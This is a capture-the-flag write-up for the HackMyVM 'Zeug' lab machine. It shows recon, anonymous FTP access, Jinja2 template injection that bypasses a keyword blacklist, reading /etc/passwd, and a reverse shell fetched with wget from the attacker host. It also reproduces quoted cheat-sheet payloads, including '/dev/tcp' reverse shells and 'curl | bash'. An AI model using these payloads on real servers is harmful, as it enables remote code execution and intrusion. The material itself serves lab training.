# CTF Penetration Testing

## HackMyVM

### Zeug - Machine

#### Machine Description

- Machine name: [Zeug](https://hackmyvm.eu/machines/machine.php?vm=Zeug)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟥 Hard

<img src="https://hackmyvm.eu/img/vm/zeug.png" alt="Zeug Machine Logo" width="150"/>

#### Tools Used

- curl
- Ghidra
- Nmap
- pwncat-cs

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.147 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.147`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-17 21:33 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.147
Host is up (0.00062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3 ←
5000/tcp open  upnp? ←
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/17%Time=67116687%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,2D3,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1
SF:\x20Python/3\.11\.2\r\nDate:\x20Thu,\x2017\x20Oct\x202024\x2019:33:24\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x20549\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Zeug</title>\n\x20\x20\
SF:x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href=\"/stat
SF:ic/styles/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20<h1>Zeug</h1
SF:>\n\x20\x20\x20\x20<h3>Rendering\x20HTML\x20templates</h3>\n\n\x20\x20\
SF:x20\x20<form\x20action=\"/\"\x20method=\"post\"\x20enctype=\"multipart/
SF:form-data\">\n\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\"file\"\x
SF:20name=\"file\"\x20accept=\"\.html\"\x20title=\"Select\x20file\"\x20req
SF:uired>\n\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\"submit\"\x20va
SF:lue=\"Upload\">\n\x20\x20\x20\x20</form>\n\n\x20\x20\x20\x20\n\n\x20\x2
SF:0\x20\x20\n</body>\n</html>")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<tit
SF:le>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20
SF:<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP
SF:/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20exp
SF:lanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\
SF:x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,CD,
SF:"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\x20Python/3\.11\
SF:.2\r\nDate:\x20Thu,\x2017\x20Oct\x202024\x2019:33:40\x20GMT\r\nContent-
SF:Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20P
SF:OST,\x20HEAD\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
MAC Address: 08:00:27:F2:9C:82 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.06 seconds
```

`nmap -Pn -sSV --script=ftp-anon -p21 -T5 192.168.56.147`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-17 21:39 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.147
Host is up (0.00064s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230) ←
|_-rw-r--r--    1 0        0             109 Jan 06  2024 README.txt ←
MAC Address: 08:00:27:F2:9C:82 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)

[**#Anonymous login**]

- _anonymous_ : _anonymous_
- _anonymous_ :
- _ftp_ : _ftp_

```
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ftp 192.168.56.147`:
```
Connected to 192.168.56.147.
220 (vsFTPd 3.0.3)
Name (192.168.56.147:kali): anonymous ←
331 Please specify the password.
Password: ←
230 Login successful. ←
Remote system type is UNIX.
Using binary mode to transfer files.
```
```
ftp> dir
229 Entering Extended Passive Mode (|||54423|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             109 Jan 06  2024 README.txt ←
226 Directory send OK.
ftp> get README.txt ←
local: README.txt remote: README.txt
229 Entering Extended Passive Mode (|||36812|)
150 Opening BINARY mode data connection for README.txt (109 bytes).
100% |************************************************************************************************************************************************|   109       62.57 KiB/s    00:00 ETA
226 Transfer complete.
109 bytes received in 00:00 (30.51 KiB/s)
ftp> exit
221 Goodbye.
```

`cat ./README.txt`:
```                                                               
Hi, Cosette, don't forget to disable the debug mode in the web application, we don't want security breaches.
```

`whatweb http://192.168.56.147:5000`:
```
http://192.168.56.147:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.11.2], IP[192.168.56.147], Python[3.11.2], ← Title[Zeug], Werkzeug[3.0.1]
```

`curl -s http://192.168.56.147:5000:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zeug</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
    <h1>Zeug</h1>
    <h3>Rendering HTML templates</h3>

    <form action="/" method="post" enctype="multipart/form-data">
        <input type="file" name="file" accept=".html" title="Select file" required> ←
        <input type="submit" value="Upload"> ←
    </form>
</body>
</html>
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

[**#Python**]

Check out the following page to learn tricks about **arbitrary command execution bypassing sandboxes** in python:
[Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)

[**#Tornado (Python)**]

```python
{{7*7}} = 49
${7*7} = ${7*7}
{{foobar}} = Error
{{7*'7'}} = 7777777

{% import foobar %} = Error
{% import os %}

{{os.system('whoami')}}
```

[**#Jinja2 (Python)**]

> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
> 
```python
{{7*7}} = Error
${7*7} = ${7*7}
{{foobar}} Nothing
{{4*4}}[[5*5]]
{{7*'7'}} = 7777777
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{settings}}

<div data-gb-custom-block data-tag="debug"></div>

{% debug %}


{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```

**Jinja2 - Template format**:
```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
```

[**RCE not dependant from**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**More details about how to abuse Jinja**

[Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

Other payloads in: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ 7*7 }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zeug</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
    <h1>Zeug</h1>
    <h3>Rendering HTML templates</h3>

    <form action="/" method="post" enctype="multipart/form-data">
        <input type="file" name="file" accept=".html" title="Select file" required>
        <input type="submit" value="Upload">
    </form>
        <h2>Result:</h2>
        <div>&lt;html&gt;
        &lt;body&gt;
                49 ←
        &lt;/body&gt;
&lt;/html&gt;</div>
</body>
</html>
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ import os; os.system('whoami') }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

	<h3>Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: import, os</h3> ←

[...]
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

First of all, in a **Jinja injection** you need to **find a way to escape from the sandbox** and recover access the regular python execution flow. To do so, you need to **abuse objects** that are **from** the **non-sandboxed environment but are accessible from the sandbox**.

[**#Accessing Global Objects**]

For example, in the code `render_template("hello.html", username=username, email=email)` the objects username and email **come from the non-sanboxed python env** and will be **accessible** inside the **sandboxed env.** Moreover, there are other objects that will be **always accessible from the sandboxed env**, these are:
```
[]
''
()
dict
config
request
```

[**#Recovering <class 'object'>**]

Then, from these objects we need to get to the class: `**<class 'object'>**` in order to try to **recover** defined **classes**. This is because from this object we can call the `**__subclasses__**` method and **access all the classes from the non-sandboxed** python env.

In order to access that **object class**, you need to **access a class object** and then access either `**__base__**`, `**__mro__()[-1]**` or `.``**mro()[-1]**`. And then, **after** reaching this **object class** we **call** `**__subclasses__()**`.

Check these examples:
```
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object". 
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}



# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```

[**#Dump all config variables**]

```
{{ config }} #In these object you can find all the configured env variables


{% for key, value in config.items() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ config }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

    &lt;Config {&#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;

[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		# To access a class object
		[].__class__
		''.__class__
		()["__class__"] # You can also access attributes like this
		request["__class__"]
		config.__class__
		dict #It's already a class
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

    <h3>Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: request, attr, [, ]</h3> ←

[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		# From a class to access the class "object". 
		## "dict" used as example from the previous list:
		dict.__base__
		dict.mro()[-1]
		dict.__mro__[-1]
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

        <h3>Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: mro, [, ]</h3> ←
	        
[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		# From the "object" class call __subclasses__()
		{{ dict.__base__.__subclasses__() }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

    <h3>Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: subclasses</h3> ←

[...]
```

<div>
	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[Payloads All The Things - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

[**#Jinja2 - Dump all used classes**]

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

Access `__globals__` and `__builtins__`:
```python
{{ self.__init__.__globals__.__builtins__ }}
```

[**#Jinja2 - Read remote file**]

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ self.__init__.__globals__.__builtins__ }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

    <h3>Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: init</h3> ←

[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

            <h2>Result:</h2>
        <div>&lt;html&gt;
        &lt;body&gt;
        
        root:x:0:0:root:/root:/bin/bash
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		bin:x:2:2:bin:/bin:/usr/sbin/nologin
		sys:x:3:3:sys:/dev:/usr/sbin/nologin
		sync:x:4:65534:sync:/bin:/bin/sync
		games:x:5:60:games:/usr/games:/usr/sbin/nologin
		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
		lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
		mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
		news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
		uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
		proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
		backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
		list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
		irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
		_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
		nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
		systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
		messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
		avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
		cosette:x:1001:1001::/home/cosette:/bin/bash
		exia:x:1002:1002::/home/exia:/bin/bash
		ftp:x:103:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin

        &lt;/body&gt;
&lt;/html&gt;</div>

[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ get_flashed_messages.__globals__.__builtins__ }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

	'eval': <built-in function eval>, 
	'open': <built-in function open>,
	'write': <built-in function open>,

[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ get_flashed_messages.__globals__.__builtins__.eval("__imp"+"ort__('o'+'s').system('echo TEST')") }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

        <h2>Result:</h2>
        <div>&lt;html&gt;
        &lt;body&gt;
                0 ←
        &lt;/body&gt;
&lt;/html&gt;</div>

[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ get_flashed_messages.__globals__.__builtins__.eval("__imp"+"ort__('subprocess').check_output('echo TEST', shel"+"l=True).decode('utf-8')") }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

	<h2>Result:</h2>
	<div>&lt;html&gt;
	&lt;body&gt;
TEST ←
	&lt;/body&gt;
&lt;/html&gt;</div>

[...]
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Reverse Shells - Linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)

[**#Bash | sh**]

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Don't forget to check with other shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.

[**#Symbol safe shell**]

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ get_flashed_messages.__globals__.__builtins__.eval("__imp"+"ort__('subprocess').check_output('which nc', shel"+"l=True).decode('utf-8')") }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

    <h3>Error: Command &#39;which nc&#39; returned non-zero exit status 1.</h3> ←

[...]
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ get_flashed_messages.__globals__.__builtins__.eval("__imp"+"ort__('subprocess').check_output('bash -c bash -i >& /dev/tcp/192.168.56.118/4444 0>&1', shel"+"l=True).decode('utf-8')") }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`:
```html
[...]

<h3>Error: Command &#39;bash -c bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.118/4444 0&amp;gt;&amp;amp;1&#39; returned non-zero exit status 2.</h3> ←

[...]
```

`pwncat-cs -lp 4444`:
```
[13:13:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

`vim ./revsh.sh`:
```bash
bash -c bash -i >& /dev/tcp/192.168.56.118/4444 0>&1
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

`vim ./html_python_request.txt`:
```http
-----------------------------156927482725802177751080524724
Content-Disposition: form-data; name="file"; filename="python_test.html"
Content-Type: text/html

<html>
	<body>
		{{ get_flashed_messages.__globals__.__builtins__.eval("__imp"+"ort__('o'+'s').system('wget http://192.168.56.118/revsh.sh; bash ./revsh.sh')") }}
	</body>
</html>

-----------------------------156927482725802177751080524724--
```

`curl -X POST http://192.168.56.147:5000/ --data-binary @html_python_request.txt --header "Content-Type: multipart/form-data; boundary=---------------------------156927482725802177751080524724"`

```
[13:21:45] received connection from 192.168.56.147:45604 ←
[13:21:46] 192.168.56.147:45604: registered new host w/ db
```

![Victim: cosette](https://img.shields.io/badge/Victim-cosette-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
cosette ←
```

`id`:
```
uid=1001(cosette) gid=1001(cosette) groups=1001(cosette)
```

`uname -a`:
```
Linux zeug 6.1.0-17-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.69-1 (2023-12-30) x86_64 GNU/Linux
```

`cat /etc/os-release`:
```
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
